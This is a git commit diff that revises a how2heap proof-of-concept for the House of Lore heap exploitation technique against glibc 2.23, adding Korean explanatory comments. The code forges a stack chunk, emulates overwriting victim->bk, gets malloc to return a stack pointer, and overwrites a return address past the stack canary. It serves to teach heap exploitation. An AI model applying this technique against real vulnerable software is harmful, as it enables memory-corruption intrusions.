0f38dc1385d2d53ae887be2423b06d3c13800c58
umbum <umbum7601@gmail.com>
2017-08-14 13:49:26 +0000

    lore

--- how2heap/house_of_lore_fast.c
+++ how2heap/house_of_lore_fast.c
@@ -1,26 +1,3 @@
-/*
-Advanced exploitation of the House of Lore - Malloc Maleficarum.
-This PoC take care also of the glibc hardening of smallbin corruption.
-
-[ ... ]
-
-else
-    {
-      bck = victim->bk;
-    if (__glibc_unlikely (bck->fd != victim)){
-
-                  errstr = "malloc(): smallbin double linked list corrupted";
-                  goto errout;
-                }
-
-       set_inuse_bit_at_offset (victim, nb);
-       bin->bk = bck;
-       bck->fd = bin;
-
-       [ ... ]
-
-*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -32,82 +9,67 @@ int main(int argc, char * argv[]){
 
 
   intptr_t* fake_chunk[4] = {0};
-  intptr_t* stack_buffer_2[3] = {0};
+  intptr_t* bypass_buf[3] = {0};
 
-  printf("\nWelcome to the House of Lore\n");
-  printf("This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
   printf("This is tested against Ubuntu 14.04.4 - 64bit - glibc-2.23\n\n");
 
-  printf("Allocating the victim chunk\n");
   intptr_t *victim = malloc(100);    // fastbins ( 64bit )
-  printf("Allocated the first small chunk on the heap at %p\n", victim);
-
-  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
-  intptr_t *victim_chunk = victim-2;
+  printf("Allocating the victim chunk : %p\n\n", victim);
+  
 
   printf("fake_chunk at %p\n", (void*)fake_chunk);
-  printf("stack_buffer_2 at %p\n", (void*)stack_buffer_2);
+  printf("bypass_buf at %p\n\n", (void*)bypass_buf);
 
-  printf("Create a fake chunk on the stack");
-  printf("Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
-         "in second to the last malloc, which putting stack address on smallbin list\n");
+  printf("=== fake_chunk setting ===\n");
+  printf("Set the fwd pointer to the victim's mchunkptr in order to bypass the check of smallbin bk check\n");
+  printf("Set fake_chunk->bk == bypass_buf AND bypass_buf->fd == fake_chunk\n\n");
+  // fake_chunk가 반환될 때, fake_chunk->bk->fd == fake_chunk인지 검사하기 때문.
   fake_chunk[0] = 0;
   fake_chunk[1] = 0;
-  fake_chunk[2] = victim_chunk;
-
-  printf("Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to fake_chunk "
-         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
-         "chunk on stack");
-  fake_chunk[3] = (intptr_t*)stack_buffer_2;
-  stack_buffer_2[2] = (intptr_t*)fake_chunk;
+  fake_chunk[2] = victim-2;  // victim's mchunkptr
+  fake_chunk[3] = (intptr_t*)bypass_buf;  
+  bypass_buf[2] = (intptr_t*)fake_chunk;
   
   printf("Allocating another large chunk in order to avoid consolidating the top chunk with"
          "the small one during the free()\n");
-  void *p5 = malloc(1000);
-  printf("Allocated the large chunk on the heap at %p\n", p5);
+  void *top_guard = malloc(1000);
+  printf("Allocated the large chunk on the heap at %p\n", top_guard);
 
 
-  printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
+  printf("\n\nFreeing victim : %p, it will be inserted in the ******* FASTBIN *******\n\n", victim);
   free((void*)victim);
 
-  printf("\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
+  printf("\nBecause victim is in the fastbin, victim's fwd and bk pointers are nil\n");
   printf("victim->fwd: %p\n", (void *)victim[0]);
   printf("victim->bk: %p\n\n", (void *)victim[1]);
 
-  printf("Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
-  printf("This means that the chunk %p will be inserted in front of the SmallBin\n", victim);
-  
-  /* 이걸 안하면, fastbin에 있는 victim이 unsorted bin->smallbin으로 옮겨지지 않고
-  그냥 fastbin에 있기 때문에 애초에 bk를 사용하지 않는다.*/
-  void *p2 = malloc(1200);
-  printf("The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);
 
-  printf("The victim chunk has been sorted and its fwd and bk pointers updated\n");
-  printf("victim->fwd: %p\n", (void *)victim[0]);
+  printf("Now performing a malloc(large)\n");
+  printf("victim : %p will be inserted in front of the smallbin\n", victim);
+  /* 이걸 안하면, fastbin에 있는 victim이 unsorted bin->smallbin으로 옮겨지지 않고
+  그냥 fastbin에 있기 때문에 애초에 bk를 사용하지 않는다. 따라서 반드시 해주어야 한다.*/
+  void *mov_to_smallbin = malloc(1200);
+
+  printf("victim은 smallbin으로 옮겨졌으므로 fd / bk는 smallbin에 link된다.\n");
+  printf("victim->fd: %p\n", (void *)victim[0]);
   printf("victim->bk: %p\n\n", (void *)victim[1]);
 
   //------------VULNERABILITY-----------
 
-  printf("Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
-
-  victim[1] = (intptr_t)fake_chunk; // victim->bk is pointing to stack
+  printf("victim->bk 값을 fake_chunk : %p 로 변경한다\n", fake_chunk);
+  victim[1] = (intptr_t)fake_chunk;
 
   //------------------------------------
 
-  printf("Now allocating a chunk with size equal to the first one freed\n");
-  printf("This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");
+  void *victim_2 = malloc(100);  // return victim chunk and link fake chunk to smallbin
+  printf("그 다음 첫 번째 malloc(fast)는 victim을 반환한다. : %p\n", victim_2);
+  
+  char *fake_2 = malloc(100);  // return fake chunk
+  printf("그 다음 두 번째 malloc(fast)는 fake_chunk+2*sizeof(void*)를 반환한다. : %p\n", fake_2);
 
-  void *p3 = malloc(100);  // return victim chunk and link fake chunk to smallbin
+  printf("\nThe fwd pointer of bypass_buf has changed after the last malloc to %p\n",
+         bypass_buf[2]);
 
-
-  printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
-  char *p4 = malloc(100);  // return fake chunk
-  printf("p4 = malloc(100)\n");
-
-  printf("\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
-         stack_buffer_2[2]);
-
-  printf("\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
-  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+  memcpy((fake_2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
 }
